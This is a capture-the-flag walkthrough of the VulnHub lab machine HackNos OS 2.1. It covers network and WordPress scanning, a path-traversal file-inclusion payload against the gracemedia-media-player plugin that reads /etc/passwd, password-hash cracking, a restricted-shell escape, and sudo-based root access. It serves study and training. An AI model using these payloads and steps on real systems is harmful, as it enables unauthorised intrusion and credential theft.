
# HackNos OS 2.1 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/hacknos-os-hacknos-21,403/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.121   08:00:27:89:de:b1      1      60  PCS Systemtechnik GmbH         
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.121
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-24 14:58 -03
Nmap scan report for 192.168.1.121
Host is up (0.00027s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)
|   256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)
|_  256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.02 seconds
```

### WEB Analysis

```
$ dirb http://192.168.1.121

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jan 24 14:59:10 2021
URL_BASE: http://192.168.1.121/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.121/ ----
+ http://192.168.1.121/index.html (CODE:200|SIZE:10918)                                                              
+ http://192.168.1.121/server-status (CODE:403|SIZE:278)                                                             
==> DIRECTORY: http://192.168.1.121/tsweb/                                                                           
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/ ----
+ http://192.168.1.121/tsweb/index.php (CODE:301|SIZE:0)                                                             
==> DIRECTORY: http://192.168.1.121/tsweb/wp-admin/                                                                  
==> DIRECTORY: http://192.168.1.121/tsweb/wp-content/                                                                
==> DIRECTORY: http://192.168.1.121/tsweb/wp-includes/                                                               
+ http://192.168.1.121/tsweb/xmlrpc.php (CODE:405|SIZE:42)                                                           
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-admin/ ----
+ http://192.168.1.121/tsweb/wp-admin/admin.php (CODE:302|SIZE:0)                                                    
==> DIRECTORY: http://192.168.1.121/tsweb/wp-admin/css/                                                              
==> DIRECTORY: http://192.168.1.121/tsweb/wp-admin/images/                                                           
==> DIRECTORY: http://192.168.1.121/tsweb/wp-admin/includes/                                                         
+ http://192.168.1.121/tsweb/wp-admin/index.php (CODE:302|SIZE:0)                                                    
==> DIRECTORY: http://192.168.1.121/tsweb/wp-admin/js/                                                               
==> DIRECTORY: http://192.168.1.121/tsweb/wp-admin/maint/                                                            
==> DIRECTORY: http://192.168.1.121/tsweb/wp-admin/network/                                                          
==> DIRECTORY: http://192.168.1.121/tsweb/wp-admin/user/                                                             
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-content/ ----
+ http://192.168.1.121/tsweb/wp-content/index.php (CODE:200|SIZE:0)                                                  
==> DIRECTORY: http://192.168.1.121/tsweb/wp-content/plugins/                                                        
==> DIRECTORY: http://192.168.1.121/tsweb/wp-content/themes/                                                         
==> DIRECTORY: http://192.168.1.121/tsweb/wp-content/upgrade/                                                        
==> DIRECTORY: http://192.168.1.121/tsweb/wp-content/uploads/                                                        
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-admin/network/ ----
+ http://192.168.1.121/tsweb/wp-admin/network/admin.php (CODE:503|SIZE:2664)                                         
+ http://192.168.1.121/tsweb/wp-admin/network/index.php (CODE:302|SIZE:0)                                            
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-admin/user/ ----
+ http://192.168.1.121/tsweb/wp-admin/user/admin.php (CODE:302|SIZE:0)                                               
+ http://192.168.1.121/tsweb/wp-admin/user/index.php (CODE:302|SIZE:0)                                               
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-content/plugins/ ----
+ http://192.168.1.121/tsweb/wp-content/plugins/index.php (CODE:200|SIZE:0)                                          
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-content/themes/ ----
+ http://192.168.1.121/tsweb/wp-content/themes/index.php (CODE:200|SIZE:0)                                           
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.121/tsweb/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sun Jan 24 14:59:29 2021
DOWNLOADED: 36896 - FOUND: 13
```

```
$ nikto -h http://192.168.1.121

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.121
+ Target Hostname:    192.168.1.121
+ Target Port:        80
+ Start Time:         2021-01-24 15:06:39 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5978e3d67036e, mtime: gzip
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ Uncommon header 'link' found, with multiple values: (<http://192.168.1.121/tsweb/index.php/wp-json/>; rel="https://api.w.org/",<http://192.168.1.121/tsweb/>; rel=shortlink,)
+ /tsweb/: Microsoft TSAC found. http://www.dslwebserver.com/main/fr_index.html?/main/sbs-Terminal-Services-Advanced-Client-Configuration.html
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-01-24 15:07:39 (GMT-3) (60 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### WordPress Analysis

```
$ wpscan -e ap,at,u --url http://192.168.1.121/tsweb
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.13
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.121/tsweb/ [192.168.1.121]
[+] Started: Sun Jan 24 15:15:59 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.121/tsweb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://192.168.1.121/tsweb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.1.121/tsweb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.121/tsweb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.6 identified (Latest, released on 2020-10-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.1.121/tsweb/index.php/feed/, <generator>https://wordpress.org/?v=5.3.6</generator>
 |  - http://192.168.1.121/tsweb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.6</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://192.168.1.121/tsweb/wp-content/themes/twentytwenty/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://192.168.1.121/tsweb/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | Style URL: http://192.168.1.121/tsweb/wp-content/themes/twentytwenty/style.css?ver=1.0
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.121/tsweb/wp-content/themes/twentytwenty/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] gracemedia-media-player
 | Location: http://192.168.1.121/tsweb/wp-content/plugins/gracemedia-media-player/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2013-07-21T15:09:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.1.121/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.1.121/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:29 <==================================> (22065 / 22065) 100.00% Time: 00:00:29
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentynineteen
 | Location: http://192.168.1.121/tsweb/wp-content/themes/twentynineteen/
 | Last Updated: 2020-12-22T00:00:00.000Z
 | Readme: http://192.168.1.121/tsweb/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 1.9
 | Style URL: http://192.168.1.121/tsweb/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.1.121/tsweb/wp-content/themes/twentynineteen/, status: 500
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.121/tsweb/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.4'

[+] twentyseventeen
 | Location: http://192.168.1.121/tsweb/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://192.168.1.121/tsweb/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://192.168.1.121/tsweb/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.1.121/tsweb/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 2.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.121/tsweb/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.2'

[+] twentysixteen
 | Location: http://192.168.1.121/tsweb/wp-content/themes/twentysixteen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://192.168.1.121/tsweb/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://192.168.1.121/tsweb/wp-content/themes/twentysixteen/style.css
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.1.121/tsweb/wp-content/themes/twentysixteen/, status: 500
 |
 | Version: 2.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.121/tsweb/wp-content/themes/twentysixteen/style.css, Match: 'Version: 2.0'

[+] twentytwenty
 | Location: http://192.168.1.121/tsweb/wp-content/themes/twentytwenty/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://192.168.1.121/tsweb/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | Style URL: http://192.168.1.121/tsweb/wp-content/themes/twentytwenty/style.css
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://192.168.1.121/tsweb/wp-content/themes/twentytwenty/, status: 500
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.121/tsweb/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] user
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.1.121/tsweb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jan 24 15:16:41 2021
[+] Requests Done: 22106
[+] Cached Requests: 45
[+] Data Sent: 5.942 MB
[+] Data Received: 3.529 MB
[+] Memory used: 331.66 MB
[+] Elapsed time: 00:00:42
```

Old Plugin Found: **gracemedia-media-player**\
User found: **user**

### Exploiting

The old plugin `gracemedia-media-player` is vulnerable to Local File Inclusion (LFI): https://www.exploit-db.com/exploits/46537 \
Validation exception with suggested PoC:
```
IV. PROOF OF CONCEPT
-------------------------
The following URL have been confirmed that is vulnerable to local file inclusion.

Local File Inclusion POC:

GET
/wordpress/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
```

Using our target context, we have:
```
http://192.168.1.121/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
```

So we just have to perform the GET request and the `/etc/passwd` content is returned:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash
```

### Cracking Password

Cracking **flag** user password:
```
$ cat flag.hash 
flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash

$ john -wordlist=/usr/share/wordlists/rockyou.txt flag.hash 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
topsecret        (flag)
1g 0:00:00:00 DONE (2021-01-24 15:31) 25.00g/s 172800p/s 172800c/s 172800C/s heybaby..baby05
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Credentials:
* User: **flag**
* Pass: **topsecret**

### SSH Access

This credentials allows us SSH login:
```
$ ssh flag@192.168.1.121
flag@192.168.1.121's password: topsecret

Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan 24 18:33:49 UTC 2021

  System load:  0.38              Processes:             105
  Usage of /:   54.6% of 9.78GB   Users logged in:       0
  Memory usage: 37%               IP address for enp0s3: 192.168.1.121
  Swap usage:   1%

 * Introducing self-healing high availability clusters in MicroK8s.
   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.

     https://microk8s.io/high-availability

105 packages can be updated.
0 updates are security updates.

New release '20.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

*** System restart required ***

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jan 24 18:33:12 2021 from 192.168.1.189
Could not chdir to home directory /home/flag: No such file or directory

flag@hacknos:/$ id
uid=1001(flag) gid=1003(flag) groups=1003(flag)
```

The user **flag** is configured to used a limited shell `/bin/rbash`.\
We can avoid it calling a bash with no profile:
```
flag@hacknos:/$ cd home
-rbash: cd: restricted

flag@hacknos:/$ bash --noprofile
flag@hacknos:/$ cd home
flag@hacknos:/home$
```

### Cracking rohit Password

Looking for root files, we can find an unusual file: `/var/backups/passbkp/md5-hash`
```
flag@hacknos:/$ find /var/backups -group root 2>/dev/null
/var/backups
/var/backups/passbkp
/var/backups/passbkp/md5-hash                 <<<<
/var/backups/apt.extended_states.1.gz
/var/backups/apt.extended_states.0
/var/backups/apt.extended_states.2.gz
```

It contains the **rohit** password hash:
```
flag@hacknos:/var/backups/passbkp$ cat md5-hash 
$1$rohit$01Dl0NQKtgfeL08fGrggi0
```

Lets crack it with John the Ripper:
```
$ cat rohit.hash 
$1$rohit$01Dl0NQKtgfeL08fGrggi0

$ john -wordlist=/usr/share/wordlists/rockyou.txt rohit.hash 

Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!%hack41         (?)
1g 0:00:00:57 DONE (2021-01-24 17:23) 0.01739g/s 245238p/s 245238c/s 245238C/s !1reedward..!##^%^
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Credentials:
* User: **rohit**
* Pass: **!%hack41**

### Privilege Escalation - rohit

Now we only have to login with rohit credentials:
```
flag@hacknos:/var/backups$ su - rohit
Password: !%hack41

rohit@hacknos:~$ id
uid=1000(rohit) gid=1000(rohit) groups=1000(rohit),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

### Flag #1 - User

```
rohit@hacknos:~$ cat /home/rohit/user.txt 

############################################ 
 __    __   _______   ______    ______             
/  |  /  | /       | /      \  /      \   
$$ |  $$ |/$$$$$$$/ /$$$$$$  |/$$$$$$  |
$$ |  $$ |$$      \ $$    $$ |$$ |  
$$ \__$$ | $$$$$$  |$$$$$$$$/ $$ |       
$$    $$/ /     $$/ $$       |$$ |           
 $$$$$$/  $$$$$$$/   $$$$$$$/ $$/
                                                    
############################################

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
```

### Privilege Escalation - Root

Rohit user already has super user privileges:
```
rohit@hacknos:~$ sudo -l
[sudo] password for rohit: !%hack41

Matching Defaults entries for rohit on hacknos:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rohit may run the following commands on hacknos:
    (ALL : ALL) ALL

rohit@hacknos:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```

### Flag #2 - Root

```
rohit@hacknos:~$ sudo su
root@hacknos:/home/rohit# 

root@hacknos:~# cat /root/root.txt 
 _______                         __              __  __     #
/       \                       /  |            /  |/  |    #
$$$$$$$  |  ______    ______   _$$ |_          _$$ |$$ |_   #
$$ |__$$ | /      \  /      \ / $$   |        / $$  $$   |  #
$$    $$< /$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$$$$$/   #
$$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __       / $$  $$   |  # 
$$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |      $$$$$$$$$$/   #
$$ |  $$ |$$    $$/ $$    $$/   $$  $$/         $$ |$$ |    #
$$/   $$/  $$$$$$/   $$$$$$/     $$$$/          $$/ $$/     #
#############################################################                                                          
                                                          
#############################################################                                                          
MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
Blog : www.hackNos.com
Author : Rahul Gehlaut
linkedin : https://www.linkedin.com/in/rahulgehlaut/
#############################################################
```
